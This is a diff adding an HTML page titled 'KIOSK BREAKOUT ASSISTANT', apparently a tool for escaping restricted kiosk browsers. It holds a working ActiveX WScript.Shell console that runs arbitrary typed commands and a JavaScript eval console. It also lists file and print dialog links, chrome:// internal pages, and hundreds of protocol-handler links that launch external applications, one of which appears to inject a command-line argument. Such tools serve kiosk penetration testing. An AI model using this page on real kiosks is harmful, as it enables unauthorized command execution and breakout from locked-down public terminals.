@@ -1,0 +1,532 @@
+<html>
+<head>
+        <script>
+        function runCommand() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                var command = document.getElementById("command").value;
+                var exec = shell.Exec(command);
+                var output = "";
+
+                while (!exec.StdOut.AtEndOfStream) {
+                    output += exec.StdOut.ReadLine() + "\n";
+                }
+
+                document.getElementById("output").value = output;
+            } catch (e) {
+                alert("Not Enabled");
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #00000050; 
+            font-family: 'Helvetica', sans-serif; 
+        }
+        h2 {
+        color: grey;
+        }
+        h1{
+        color: grey;
+        }
+    </style>
+</head>
+<h1>KIOSK BREAKOUT ASSISTANT</h1>
+<h2>JAVASCRIPT CONSOLE</h2>
+<textarea id="o" cols="40" rows="10" readonly></textarea><br>
+<textarea id="i" cols="40" rows="5"></textarea><br>
+<button onclick="try{o.value+=eval(i.value)+'\n'}catch(e){o.value+=e+'\n'}i.value=''">Run</button>
+<h2>ACTIVEX CONSOLE</h2>
+<textarea id="output" readonly></textarea><br>
+<input id="command" type="text"><br>
+<button onclick="runCommand()">Run</button>
+<h2>COMMON DIALOGUES</h2>
+<ul>
+    <li>
+        <span><a>File Open Dialog</a></span>
+        <input type="file">
+    </li>
+    <li>
+        <span><a href="javascript:window.print()">Print</a></span>
+    </li>
+    <li>
+        <span><a href="javascript:doSaveAs()">Save As</a></span>
+    </li>
+    <li>
+        <span><a href="printpreview.html" target="right">Print Preview</a></span>
+    </li>
+</ul>
+<h2>CHROMIUM SETTINGS</h2>
+<ul>
+<li>chrome://settings/</li>
+<li>chrome://flags/</li>
+<li>chrome://extensions/</li>
+<li>chrome://downloads/</li>
+<li>chrome://history/</li>
+<li>chrome://bookmarks/</li>
+<li>chrome://apps/</li>
+<li>chrome://about/</li>
+<li>chrome://version/</li>
+<li>chrome://net-internals/</li>
+<li>chrome://gpu/</li>
+<li>chrome://policy/</li>
+<li>chrome://quota-internals/</li>
+<li>chrome://dino/</li>
+<li>chrome://sandbox/</li>
+<li>chrome://discards/</li>
+<li>chrome://webrtc-internals/</li>
+<li>chrome://inspect/</li>
+<li>chrome://tracing/</li>
+<li>chrome://crashes/</li>
+<li>chrome://components/</li>
+<li>chrome://system/</li>
+<li>chrome://signin-internals/</li>
+<li>chrome://usb-internals/</li>
+<li>chrome://media-internals/</li>
+<li>chrome://password-manager-internals/</li>
+<li>chrome://bluetooth-internals/</li>
+<li>chrome://network-errors/</li>
+<li>chrome://invalidations/</li>
+</ul>
+<h2>PROTOCOL HANDLERS</h2>
+<ul>
+<li><a href="aaa://localhost"> aaa</a></li>
+<li><a href="aaas://localhost"> aaas</a></li>
+<li><a href="about://localhost"> about</a></li>
+<li><a href="acap://localhost"> acap</a></li>
+<li><a href="acct://localhost"> acct</a></li>
+<li><a href="acd://localhost"> acd</a></li>
+<li><a href="acr://localhost"> acr</a></li>
+<li><a href="acrobat://localhost"> acrobat</a></li>
+<li><a href="acsui://localhost"> acsui</a></li>
+<li><a href="adiumxtra://localhost"> adiumxtra</a></li>
+<li><a href="adt://localhost"> adt</a></li>
+<li><a href="afp://localhost"> afp</a></li>
+<li><a href="afs://localhost"> afs</a></li>
+<li><a href="aim://localhost"> aim</a></li>
+<li><a href="amss://localhost"> amss</a></li>
+<li><a href="android://localhost"> android</a></li>
+<li><a href="aolautofix://localhost"> aolautofix</a></li>
+<li><a href="appdata://localhost"> appdata</a></li>
+<li><a href="apt://localhost"> apt</a></li>
+<li><a href="ar://localhost"> ar</a></li>
+<li><a href="ark://localhost"> ark</a></li>
+<li><a href="attachment://localhost"> attachment</a></li>
+<li><a href="aw://localhost"> aw</a></li>
+<li><a href="barion://localhost"> barion</a></li>
+<li><a href="beshare://localhost"> beshare</a></li>
+<li><a href="bitcoin://localhost"> bitcoin</a></li>
+<li><a href="bitcoincash://localhost"> bitcoincash</a></li>
+<li><a href="bittorrent://localhost"> bittorrent</a></li>
+<li><a href="blob://localhost"> blob</a></li>
+<li><a href="bolo://localhost"> bolo</a></li>
+<li><a href="browserext://localhost"> browserext</a></li>
+<li><a href="cabal://localhost"> cabal</a></li>
+<li><a href="calculator://localhost"> calculator</a></li>
+<li><a href="callto://localhost"> callto</a></li>
+<li><a href="camfrog://localhost"> camfrog</a></li>
+<li><a href="cap://localhost"> cap</a></li>
+<li><a href="cast://localhost"> cast</a></li>
+<li><a href="casts://localhost"> casts</a></li>
+<li><a href="chrome-extension://localhost"> chrome-extension</a></li>
+<li><a href="chrome://localhost"> chrome</a></li>
+<li><a href="cid://localhost"> cid</a></li>
+<li><a href="coap+tcp://localhost"> coap+tcp</a></li>
+<li><a href="coap+ws://localhost"> coap+ws</a></li>
+<li><a href="coap://localhost"> coap</a></li>
+<li><a href="coaps+tcp://localhost"> coaps+tcp</a></li>
+<li><a href="coaps+ws://localhost"> coaps+ws</a></li>
+<li><a href="coaps://localhost"> coaps</a></li>
+<li><a href="com-eventbrite-attendee://localhost"> com-eventbrite-attendee</a></li>
+<li><a href="content-type://localhost"> content-type</a></li>
+<li><a href="content://localhost"> content</a></li>
+<li><a href="crid://localhost"> crid</a></li>
+<li><a href="cvs://localhost"> cvs</a></li>
+<li><a href="daap://localhost"> daap</a></li>
+<li><a href="dab://localhost"> dab</a></li>
+<li><a href="dat://localhost"> dat</a></li>
+<li><a href="data://localhost"> data</a></li>
+<li><a href="dav://localhost"> dav</a></li>
+<li><a href="diaspora://localhost"> diaspora</a></li>
+<li><a href="dict://localhost"> dict</a></li>
+<li><a href="did://localhost"> did</a></li>
+<li><a href="dis://localhost"> dis</a></li>
+<li><a href="dlna-playcontainer://localhost"> dlna-playcontainer</a></li>
+<li><a href="dlna-playsingle://localhost"> dlna-playsingle</a></li>
+<li><a href="dns://localhost"> dns</a></li>
+<li><a href="dntp://localhost"> dntp</a></li>
+<li><a href="doi://localhost"> doi</a></li>
+<li><a href="dpp://localhost"> dpp</a></li>
+<li><a href="drm://localhost"> drm</a></li>
+<li><a href="drop://localhost"> drop</a></li>
+<li><a href="dtmi://localhost"> dtmi</a></li>
+<li><a href="dtn://localhost"> dtn</a></li>
+<li><a href="dvb://localhost"> dvb</a></li>
+<li><a href="dvx://localhost"> dvx</a></li>
+<li><a href="dweb://localhost"> dweb</a></li>
+<li><a href="ed2k://localhost"> ed2k</a></li>
+<li><a href="elsi://localhost"> elsi</a></li>
+<li><a href="embedded://localhost"> embedded</a></li>
+<li><a href="ens://localhost"> ens</a></li>
+<li><a href="ethereum://localhost"> ethereum</a></li>
+<li><a href="example://localhost"> example</a></li>
+<li><a href="facetime://localhost"> facetime</a></li>
+<li><a href="fax://localhost"> fax</a></li>
+<li><a href="fdaction://localhost"> fdaction</a></li>
+<li><a href="feed://localhost"> feed</a></li>
+<li><a href="feedready://localhost"> feedready</a></li>
+<li><a href="feeds://localhost"> feeds</a></li>
+<li><a href="fido://localhost"> fido</a></li>
+<li><a href="file://localhost"> file</a></li>
+<li><a href="filesystem://localhost"> filesystem</a></li>
+<li><a href="finger://localhost"> finger</a></li>
+<li><a href="firefox.url://localhost"> firefox.url</a></li>
+<li><a href="firefoxurl://localhost"> firefoxurl</a></li>
+<li><a href="first-run-pen-experience://localhost"> first-run-pen-experience</a></li>
+<li><a href="fish://localhost"> fish</a></li>
+<li><a href="fm://localhost"> fm</a></li>
+<li><a href="ftp://localhost"> ftp</a></li>
+<li><a href="fuchsia-pkg://localhost"> fuchsia-pkg</a></li>
+<li><a href="geo://localhost"> geo</a></li>
+<li><a href="gg://localhost"> gg</a></li>
+<li><a href="git://localhost"> git</a></li>
+<li><a href="gizmoproject://localhost"> gizmoproject</a></li>
+<li><a href="gnet://localhost"> gnet</a></li>
+<li><a href="gnutella://localhost"> gnutella</a></li>
+<li><a href="go://localhost"> go</a></li>
+<li><a href="gopher://localhost"> gopher</a></li>
+<li><a href="graph://localhost"> graph</a></li>
+<li><a href="groove://localhost"> groove</a></li>
+<li><a href="grvopen://localhost"> grvopen</a></li>
+<li><a href="gsarcade://localhost"> gsarcade</a></li>
+<li><a href="gtalk://localhost"> gtalk</a></li>
+<li><a href="h323://localhost"> h323</a></li>
+<li><a href="ham://localhost"> ham</a></li>
+<li><a href="hcap://localhost"> hcap</a></li>
+<li><a href="hcp://localhost"> hcp</a></li>
+<li><a href="http://localhost"> http</a></li>
+<li><a href="https://localhost"> https</a></li>
+<li><a href="https://localhost/"> https</a></li>
+<li><a href="hxxp://localhost"> hxxp</a></li>
+<li><a href="hxxps://localhost"> hxxps</a></li>
+<li><a href="hydrazone://localhost"> hydrazone</a></li>
+<li><a href="hyper://localhost"> hyper</a></li>
+<li><a href="iax://localhost"> iax</a></li>
+<li><a href="icap://localhost"> icap</a></li>
+<li><a href="icon://localhost"> icon</a></li>
+<li><a href="icquser://localhost"> icquser</a></li>
+<li><a href="icy://localhost"> icy</a></li>
+<li><a href="ie.ftp://localhost"> ie.ftp</a></li>
+<li><a href="ie.http://localhost"> ie.http</a></li>
+<li><a href="ie.https://localhost"> ie.https</a></li>
+<li><a href="ierss://aaa"> ierss</a></li>
+<li><a href="im://localhost"> im</a></li>
+<li><a href="imap://localhost"> imap</a></li>
+<li><a href="imesync://localhost"> imesync</a></li>
+<li><a href="info://localhost"> info</a></li>
+<li><a href="iotdisco://localhost"> iotdisco</a></li>
+<li><a href="ipfs://localhost"> ipfs</a></li>
+<li><a href="ipn://localhost"> ipn</a></li>
+<li><a href="ipns://localhost"> ipns</a></li>
+<li><a href="ipp://localhost"> ipp</a></li>
+<li><a href="ipps://localhost"> ipps</a></li>
+<li><a href="irc6://localhost"> irc6</a></li>
+<li><a href="irc://localhost -P &quot;test&quot;"> irc</a></li>
+<li><a href="irc://localhost"> irc</a></li>
+<li><a href="ircs://localhost"> ircs</a></li>
+<li><a href="iris.beep://localhost"> iris.beep</a></li>
+<li><a href="iris.lwz://localhost"> iris.lwz</a></li>
+<li><a href="iris.xpc://localhost"> iris.xpc</a></li>
+<li><a href="iris.xpcs://localhost"> iris.xpcs</a></li>
+<li><a href="iris://localhost"> iris</a></li>
+<li><a href="isostore://localhost"> isostore</a></li>
+<li><a href="itms://localhost"> itms</a></li>
+<li><a href="itmss://localhost"> itmss</a></li>
+<li><a href="itpc://localhost"> itpc</a></li>
+<li><a href="jabber://localhost"> jabber</a></li>
+<li><a href="jar://localhost"> jar</a></li>
+<li><a href="jms://localhost"> jms</a></li>
+<li><a href="joost://localhost"> joost</a></li>
+<li><a href="keyparc://localhost"> keyparc</a></li>
+<li><a href="lastfm://localhost"> lastfm</a></li>
+<li><a href="lbry://localhost"> lbry</a></li>
+<li><a href="ldap://localhost"> ldap</a></li>
+<li><a href="ldaps://localhost"> ldaps</a></li>
+<li><a href="leaptofrogans://localhost"> leaptofrogans</a></li>
+<li><a href="lorawan://localhost"> lorawan</a></li>
+<li><a href="lvlt://localhost"> lvlt</a></li>
+<li><a href="m4macdrive://localhost"> m4macdrive</a></li>
+<li><a href="magnet://localhost"> magnet</a></li>
+<li><a href="mailserver://localhost"> mailserver</a></li>
+<li><a href="mailto://localhost"> mailto</a></li>
+<li><a href="mapi://localhost"> mapi</a></li>
+<li><a href="maps://localhost"> maps</a></li>
+<li><a href="market://localhost"> market</a></li>
+<li><a href="matrix://localhost"> matrix</a></li>
+<li><a href="mediajukebox://localhost"> mediajukebox</a></li>
+<li><a href="message://localhost"> message</a></li>
+<li><a href="microsoft.windows.camera.multipicker://localhost"> microsoft.windows.camera.multipicker</a></li>
+<li><a href="microsoft.windows.camera.picker://localhost"> microsoft.windows.camera.picker</a></li>
+<li><a href="microsoft.windows.camera://localhost"> microsoft.windows.camera</a></li>
+<li><a href="mid://localhost"> mid</a></li>
+<li><a href="mirc://localhost"> mirc</a></li>
+<li><a href="mms://localhost"> mms</a></li>
+<li><a href="mmst://localhost"> mmst</a></li>
+<li><a href="mmsu://localhost"> mmsu</a></li>
+<li><a href="modem://localhost"> modem</a></li>
+<li><a href="mongodb://localhost"> mongodb</a></li>
+<li><a href="morpheus://localhost"> morpheus</a></li>
+<li><a href="moz://localhost"> moz</a></li>
+<li><a href="mozilla://localhost"> mozilla</a></li>
+<li><a href="mp2p://localhost"> mp2p</a></li>
+<li><a href="mpodcast://localhost"> mpodcast</a></li>
+<li><a href="ms-access://localhost"> ms-access</a></li>
+<li><a href="ms-browser-extension://localhost"> ms-browser-extension</a></li>
+<li><a href="ms-calculator://localhost"> ms-calculator</a></li>
+<li><a href="ms-drive-to://localhost"> ms-drive-to</a></li>
+<li><a href="ms-enrollment://localhost"> ms-enrollment</a></li>
+<li><a href="ms-excel://localhost"> ms-excel</a></li>
+<li><a href="ms-eyecontrolspeech://localhost"> ms-eyecontrolspeech</a></li>
+<li><a href="ms-gamebarservices://localhost"> ms-gamebarservices</a></li>
+<li><a href="ms-gamingoverlay://localhost"> ms-gamingoverlay</a></li>
+<li><a href="ms-getoffice://localhost"> ms-getoffice</a></li>
+<li><a href="ms-help://localhost"> ms-help</a></li>
+<li><a href="ms-infopath://localhost"> ms-infopath</a></li>
+<li><a href="ms-inputapp://localhost"> ms-inputapp</a></li>
+<li><a href="ms-lockscreencomponent-config://localhost"> ms-lockscreencomponent-config</a></li>
+<li><a href="ms-media-stream-id://localhost"> ms-media-stream-id</a></li>
+<li><a href="ms-meetnow://localhost"> ms-meetnow</a></li>
+<li><a href="ms-mixedrealitycapture://localhost"> ms-mixedrealitycapture</a></li>
+<li><a href="ms-mobileplans://localhost"> ms-mobileplans</a></li>
+<li><a href="ms-officeapp://localhost"> ms-officeapp</a></li>
+<li><a href="ms-people://localhost"> ms-people</a></li>
+<li><a href="ms-powerpoint://localhost"> ms-powerpoint</a></li>
+<li><a href="ms-project://localhost"> ms-project</a></li>
+<li><a href="ms-publisher://localhost"> ms-publisher</a></li>
+<li><a href="ms-restoretabcompanion://localhost"> ms-restoretabcompanion</a></li>
+<li><a href="ms-screenclip://localhost"> ms-screenclip</a></li>
+<li><a href="ms-screensketch://localhost"> ms-screensketch</a></li>
+<li><a href="ms-search-repair://localhost"> ms-search-repair</a></li>
+<li><a href="ms-search://localhost"> ms-search</a></li>
+<li><a href="ms-secondary-screen-controller://localhost"> ms-secondary-screen-controller</a></li>
+<li><a href="ms-secondary-screen-setup://localhost"> ms-secondary-screen-setup</a></li>
+<li><a href="ms-settings-airplanemode://localhost"> ms-settings-airplanemode</a></li>
+<li><a href="ms-settings-bluetooth://localhost"> ms-settings-bluetooth</a></li>
+<li><a href="ms-settings-camera://localhost"> ms-settings-camera</a></li>
+<li><a href="ms-settings-cellular://localhost"> ms-settings-cellular</a></li>
+<li><a href="ms-settings-cloudstorage://localhost"> ms-settings-cloudstorage</a></li>
+<li><a href="ms-settings-connectabledevices://localhost"> ms-settings-connectabledevices</a></li>
+<li><a href="ms-settings-displays-topology://localhost"> ms-settings-displays-topology</a></li>
+<li><a href="ms-settings-emailandaccounts://localhost"> ms-settings-emailandaccounts</a></li>
+<li><a href="ms-settings-language://localhost"> ms-settings-language</a></li>
+<li><a href="ms-settings-location://localhost"> ms-settings-location</a></li>
+<li><a href="ms-settings-lock://localhost"> ms-settings-lock</a></li>
+<li><a href="ms-settings-nfctransactions://localhost"> ms-settings-nfctransactions</a></li>
+<li><a href="ms-settings-notifications://localhost"> ms-settings-notifications</a></li>
+<li><a href="ms-settings-power://localhost"> ms-settings-power</a></li>
+<li><a href="ms-settings-privacy://localhost"> ms-settings-privacy</a></li>
+<li><a href="ms-settings-proximity://localhost"> ms-settings-proximity</a></li>
+<li><a href="ms-settings-screenrotation://localhost"> ms-settings-screenrotation</a></li>
+<li><a href="ms-settings-wifi://localhost"> ms-settings-wifi</a></li>
+<li><a href="ms-settings-workplace://localhost"> ms-settings-workplace</a></li>
+<li><a href="ms-settings://localhost"> ms-settings</a></li>
+<li><a href="ms-spd://localhost"> ms-spd</a></li>
+<li><a href="ms-sttoverlay://localhost"> ms-sttoverlay</a></li>
+<li><a href="ms-transit-to://localhost"> ms-transit-to</a></li>
+<li><a href="ms-useractivityset://localhost"> ms-useractivityset</a></li>
+<li><a href="ms-virtualtouchpad://localhost"> ms-virtualtouchpad</a></li>
+<li><a href="ms-visio://localhost"> ms-visio</a></li>
+<li><a href="ms-walk-to://localhost"> ms-walk-to</a></li>
+<li><a href="ms-whiteboard-cmd://localhost"> ms-whiteboard-cmd</a></li>
+<li><a href="ms-whiteboard://localhost"> ms-whiteboard</a></li>
+<li><a href="ms-word://localhost"> ms-word</a></li>
+<li><a href="ms-xhelp:///?install=1&product=a&version=1&locale=en-us&brandingPackage="> ms-xhelp</a></li>
+<li><a href="msbd://localhost"> msbd</a></li>
+<li><a href="msdigitallocker://localhost"> msdigitallocker</a></li>
+<li><a href="msnim://localhost"> msnim</a></li>
+<li><a href="msrp://localhost"> msrp</a></li>
+<li><a href="msrps://localhost"> msrps</a></li>
+<li><a href="mss://localhost"> mss</a></li>
+<li><a href="mt://localhost"> mt</a></li>
+<li><a href="mtqp://localhost"> mtqp</a></li>
+<li><a href="mumble://localhost"> mumble</a></li>
+<li><a href="mupdate://localhost"> mupdate</a></li>
+<li><a href="mvn://localhost"> mvn</a></li>
+<li><a href="myim://localhost"> myim</a></li>
+<li><a href="navigatorurl://localhost"> navigatorurl</a></li>
+<li><a href="news://localhost"> news</a></li>
+<li><a href="nfs://localhost"> nfs</a></li>
+<li><a href="ni://localhost"> ni</a></li>
+<li><a href="nih://localhost"> nih</a></li>
+<li><a href="nntp://localhost"> nntp</a></li>
+<li><a href="notes://localhost"> notes</a></li>
+<li><a href="num://localhost"> num</a></li>
+<li><a href="ocf://localhost"> ocf</a></li>
+<li><a href="oid://localhost"> oid</a></li>
+<li><a href="oms://localhost"> oms</a></li>
+<li><a href="onenote-cmd://localhost"> onenote-cmd</a></li>
+<li><a href="onenote://localhost"> onenote</a></li>
+<li><a href="opaquelocktoken://localhost"> opaquelocktoken</a></li>
+<li><a href="openpgp4fpr://localhost"> openpgp4fpr</a></li>
+<li><a href="otpauth://localhost"> otpauth</a></li>
+<li><a href="outlook.shell://localhost"> outlook.shell</a></li>
+<li><a href="outlook.url.feed://localhost"> outlook.url.feed</a></li>
+<li><a href="outlook.url.mailto://localhost"> outlook.url.mailto</a></li>
+<li><a href="outlook.url.stssync://localhost"> outlook.url.stssync</a></li>
+<li><a href="outlook.url.webcal://localhost"> outlook.url.webcal</a></li>
+<li><a href="outlookfeed://localhost"> outlookfeed</a></li>
+<li><a href="outlookfeeds://localhost"> outlookfeeds</a></li>
+<li><a href="p2p://localhost"> p2p</a></li>
+<li><a href="pack://localhost"> pack</a></li>
+<li><a href="palm://localhost"> palm</a></li>
+<li><a href="pando://localhost"> pando</a></li>
+<li><a href="paparazzi://localhost"> paparazzi</a></li>
+<li><a href="payment://localhost"> payment</a></li>
+<li><a href="payto://localhost"> payto</a></li>
+<li><a href="pcast://localhost"> pcast</a></li>
+<li><a href="picasa://localhost"> picasa</a></li>
+<li><a href="pkcs11://localhost"> pkcs11</a></li>
+<li><a href="platform://localhost"> platform</a></li>
+<li><a href="plaxo://localhost"> plaxo</a></li>
+<li><a href="pnm://localhost"> pnm</a></li>
+<li><a href="podcast://localhost"> podcast</a></li>
+<li><a href="pop://localhost"> pop</a></li>
+<li><a href="ppmate://localhost"> ppmate</a></li>
+<li><a href="pres://localhost"> pres</a></li>
+<li><a href="prospero://localhost"> prospero</a></li>
+<li><a href="proxy://localhost"> proxy</a></li>
+<li><a href="psyc://localhost"> psyc</a></li>
+<li><a href="pttp://localhost"> pttp</a></li>
+<li><a href="pwid://localhost"> pwid</a></li>
+<li><a href="qb://localhost"> qb</a></li>
+<li><a href="query://localhost"> query</a></li>
+<li><a href="quic-transport://localhost"> quic-transport</a></li>
+<li><a href="quicktime://localhost"> quicktime</a></li>
+<li><a href="redis://localhost"> redis</a></li>
+<li><a href="rediss://localhost"> rediss</a></li>
+<li><a href="reload://localhost"> reload</a></li>
+<li><a href="res://localhost"> res</a></li>
+<li><a href="resource://localhost"> resource</a></li>
+<li><a href="rhap://localhost"> rhap</a></li>
+<li><a href="rlogin://localhost"> rlogin</a></li>
+<li><a href="rmi://localhost"> rmi</a></li>
+<li><a href="rsync://localhost"> rsync</a></li>
+<li><a href="rtmfp://localhost"> rtmfp</a></li>
+<li><a href="rtmp://localhost"> rtmp</a></li>
+<li><a href="rtsp://localhost"> rtsp</a></li>
+<li><a href="rtsps://localhost"> rtsps</a></li>
+<li><a href="rtspu://localhost"> rtspu</a></li>
+<li><a href="sarif://localhost"> sarif</a></li>
+<li><a href="sc://localhost"> sc</a></li>
+<li><a href="Scheme://localhost"> Scheme</a></li>
+<li><a href="scp://localhost"> scp</a></li>
+<li><a href="search-ms://localhost"> search-ms</a></li>
+<li><a href="secondlife://localhost"> secondlife</a></li>
+<li><a href="secret-token://localhost"> secret-token</a></li>
+<li><a href="service://localhost"> service</a></li>
+<li><a href="session://localhost"> session</a></li>
+<li><a href="sftp://localhost"> sftp</a></li>
+<li><a href="sgn://localhost"> sgn</a></li>
+<li><a href="shareaza://localhost"> shareaza</a></li>
+<li><a href="shc://localhost"> shc</a></li>
+<li><a href="shout://localhost"> shout</a></li>
+<li><a href="shttp://localhost"> shttp</a></li>
+<li><a href="sieve://localhost"> sieve</a></li>
+<li><a href="sig2dat://localhost"> sig2dat</a></li>
+<li><a href="simpleledger://localhost"> simpleledger</a></li>
+<li><a href="simplex://localhost"> simplex</a></li>
+<li><a href="sip://localhost"> sip</a></li>
+<li><a href="sips://localhost"> sips</a></li>
+<li><a href="skype://localhost"> skype</a></li>
+<li><a href="smb://localhost"> smb</a></li>
+<li><a href="smp://localhost"> smp</a></li>
+<li><a href="sms://localhost"> sms</a></li>
+<li><a href="smtp://localhost"> smtp</a></li>
+<li><a href="snews://localhost"> snews</a></li>
+<li><a href="snmp://localhost"> snmp</a></li>
+<li><a href="soap.beep://localhost"> soap.beep</a></li>
+<li><a href="soap.beeps://localhost"> soap.beeps</a></li>
+<li><a href="soldat://localhost"> soldat</a></li>
+<li><a href="sop://localhost"> sop</a></li>
+<li><a href="spiffe://localhost"> spiffe</a></li>
+<li><a href="spotify://localhost"> spotify</a></li>
+<li><a href="ssb://localhost"> ssb</a></li>
+<li><a href="ssh://localhost"> ssh</a></li>
+<li><a href="steam://localhost"> steam</a></li>
+<li><a href="stickynotes://localhost"> stickynotes</a></li>
+<li><a href="stssync://localhost"> stssync</a></li>
+<li><a href="stun://localhost"> stun</a></li>
+<li><a href="stuns://localhost"> stuns</a></li>
+<li><a href="submit://localhost"> submit</a></li>
+<li><a href="svn+ssh://localhost"> svn+ssh</a></li>
+<li><a href="svn://localhost"> svn</a></li>
+<li><a href="swh://localhost"> swh</a></li>
+<li><a href="swid://localhost"> swid</a></li>
+<li><a href="swidpath://localhost"> swidpath</a></li>
+<li><a href="synacast://localhost"> synacast</a></li>
+<li><a href="tag://localhost"> tag</a></li>
+<li><a href="teamspeak://localhost"> teamspeak</a></li>
+<li><a href="tel://localhost"> tel</a></li>
+<li><a href="teliaeid://localhost"> teliaeid</a></li>
+<li><a href="telnet://localhost"> telnet</a></li>
+<li><a href="tftp://localhost"> tftp</a></li>
+<li><a href="things://localhost"> things</a></li>
+<li><a href="thismessage://localhost"> thismessage</a></li>
+<li><a href="tip://localhost"> tip</a></li>
+<li><a href="tn3270://localhost"> tn3270</a></li>
+<li><a href="tool://localhost"> tool</a></li>
+<li><a href="torrent://localhost"> torrent</a></li>
+<li><a href="tscrec4://localhost"> tscrec4</a></li>
+<li><a href="tsvn://localhost"> tsvn</a></li>
+<li><a href="turn://localhost"> turn</a></li>
+<li><a href="turns://localhost"> turns</a></li>
+<li><a href="tv://localhost"> tv</a></li>
+<li><a href="tvants://localhost"> tvants</a></li>
+<li><a href="tvu://localhost"> tvu</a></li>
+<li><a href="udp://localhost"> udp</a></li>
+<li><a href="unreal://localhost"> unreal</a></li>
+<li><a href="unsv://localhost"> unsv</a></li>
+<li><a href="URI://localhost"> URI</a></li>
+<li><a href="urn://localhost"> urn</a></li>
+<li><a href="ut2004://localhost"> ut2004</a></li>
+<li><a href="uuid-in-package://localhost"> uuid-in-package</a></li>
+<li><a href="uvox://localhost"> uvox</a></li>
+<li><a href="v-event://localhost"> v-event</a></li>
+<li><a href="vemmi://localhost"> vemmi</a></li>
+<li><a href="ventrilo://localhost"> ventrilo</a></li>
+<li><a href="ves://localhost"> ves</a></li>
+<li><a href="videotex://localhost"> videotex</a></li>
+<li><a href="view-source://localhost"> view-source</a></li>
+<li><a href="vnc://localhost"> vnc</a></li>
+<li><a href="vs://localhost"> vs</a></li>
+<li><a href="vscode-insiders://localhost"> vscode-insiders</a></li>
+<li><a href="vscode://localhost"> vscode</a></li>
+<li><a href="vsls://localhost"> vsls</a></li>
+<li><a href="wais://localhost"> wais</a></li>
+<li><a href="wcr://localhost"> wcr</a></li>
+<li><a href="webcal://localhost"> webcal</a></li>
+<li><a href="webcals://localhost"> webcals</a></li>
+<li><a href="wifi://localhost"> wifi</a></li>
+<li><a href="windowsmail.url.mailto://localhost"> windowsmail.url.mailto</a></li>
+<li><a href="windowsmail.url.news://localhost"> windowsmail.url.news</a></li>
+<li><a href="windowsmail.url.nntp://localhost"> windowsmail.url.nntp</a></li>
+<li><a href="windowsmail.url.snews://localhost"> windowsmail.url.snews</a></li>
+<li><a href="wpc://localhost"> wpc</a></li>
+<li><a href="wpid://localhost"> wpid</a></li>
+<li><a href="ws://localhost"> ws</a></li>
+<li><a href="wss://localhost"> wss</a></li>
+<li><a href="wtai://localhost"> wtai</a></li>
+<li><a href="wyciwyg://localhost"> wyciwyg</a></li>
+<li><a href="xcon-userid://localhost"> xcon-userid</a></li>
+<li><a href="xcon://localhost"> xcon</a></li>
+<li><a href="xfire://localhost"> xfire</a></li>
+<li><a href="xmlrpc.beep://localhost"> xmlrpc.beep</a></li>
+<li><a href="xmlrpc.beeps://localhost"> xmlrpc.beeps</a></li>
+<li><a href="xmpp://localhost"> xmpp</a></li>
+<li><a href="xri://localhost"> xri</a></li>
+<li><a href="ymsgr://localhost"> ymsgr</a></li>
+<li><a href="z39.50://localhost"> z39.50</a></li>
+<li><a href="z39.50r://localhost"> z39.50r</a></li>
+<li><a href="z39.50s://localhost"> z39.50s</a></li>
+    </ul>
+</html>
